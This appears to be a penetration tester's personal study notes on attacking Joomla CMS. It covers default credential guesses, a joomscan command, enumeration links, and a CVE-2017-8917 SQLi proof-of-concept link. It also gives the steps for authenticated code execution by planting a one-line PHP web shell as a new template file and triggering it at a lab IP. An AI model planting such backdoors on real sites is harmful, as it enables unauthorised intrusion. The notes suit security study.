<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Joomla</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Joomla</h1><br/><p><h1>Background</h1></p><p><h2>Default Credentials</h2></p><p>The default username is admin, but it should prompt for password creation when it&#39;s being setup, so it&#39;s unlikely to be a default credential. Regardless, try the following credentials.</p><p></p><p><strong>admin</strong>:</p><p><strong>admin</strong>:<strong>admin</strong></p><p><strong>admin</strong>:<strong>password</strong></p><p></p><p><h1>Scanning Tool (joomscan)</h1></p><p>joomscan works similarly to wpscan. It&#39;ll try to enum WebApp &amp; tries detecting vulns. Point it at the subdir that Joomla CMS is being served out of (if any), like <strong>/cms/</strong>.</p><p>-ec tries to enum components (similarly to how WP has plugins that may be vuln). May be able to manually list components in <strong>administrator/components/</strong>, but there are too many to quickly research them all.</p><p></p><p>Also see <a href="https://github.com/SamJoan/droopescan">droopescan</a></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Like <strong>wpscan</strong> &amp; <strong>searchsploit</strong>, this won&#39;t give an exhaustive list of all vulns. It&#39;s good for initial recon, but <span style="color:#ff0000;">manually check for vuln versions</span>, etc.</p><p></p><p><em>joomscan --ec -u </em>http://TARGET/cms/<em> --proxy=http://localhost:8080</em></p><p></p><p><h1>Enumeration</h1></p><p>If Joomla (CMS) is being served out of a specific subdir of a <a href="Recon_+_Services--WebApp_12.html">WebApp</a>, modify basic recon to use that as the Webroot. For ex, <em>http://target.com/</em><em><strong>cms</strong></em><em>/web.config.txt</em></p><p></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#enumeration">Basic Recon</a> (Version info, Subdir Enum, etc). Hacktricks also has <span style="color:#ff0000;">Authenticated RCE</span> &amp; <span style="color:#ff0000;">XSS to RCE</span> (in Joomla 3.x.x to 5.x.x).</p><p></p><p>Also see <a href="https://exploit-notes.hdks.org/exploit/web/cms/joomla-cms-pentesting/">exploit-notes</a> for Common Directories &amp; other info</p><p></p><p><h2>Version Number</h2></p><p>Version should be listed in <strong>README.txt</strong>, located in Joomla&#39;s Base Directory (e.g. <strong>/</strong> or <strong>/cms/ </strong>etc).</p><p></p><p><h1>Authenticated RCE</h1></p><p>Find the Admin Panel (if Joomla is in Web Root, it&#39;s often <strong>/administrator/</strong> ).</p><p></p><p><h2>Template</h2></p><p>You can either edit a template&#39;s existing file, or you can create a New File / Upload a File for the template.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: <span style="color:#ff0000;">Creating a New File worked better than editing a file</span>. Maybe I was just adding the payload to the wrong place in the edited file?</p><p></p><p><span style="text-decoration:underline;">Admin Panel:</span> <strong>Templates</strong> (on the left) ↓ <strong>Templates</strong> (instead of Style) → Select a Template (e.g. <strong>protostar</strong>)</p><p></p><p><h3>Create Backdoor</h3></p><p>After creating, paste in Payload &amp; then hit <strong>Save &amp; Close</strong>.</p><p></p><p><strong>New File</strong>  ↓ <strong>Name:</strong> evil  ↓ <strong>File Type:</strong> PHP  → <strong>Create</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Payload</span>: <em>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</em></p><p></p><p><h3>Trigger</h3></p><p>Nav to the URL, or use <strong>curl -s</strong>. (If Joomla isn&#39;t in Web Root, the file&#39;s directory may vary)</p><p></p><p>http://10.10.38.156/templates/protostar/evil.php?cmd=id</p><p></p><p><h1>Joomla 3.7 SQLi</h1></p><p>Use this <a href="https://github.com/stefanlucas/Exploit-Joomla/tree/master?tab=readme-ov-file">PoC</a> for CVE-2017-8917</p></div>
</body>
</html>
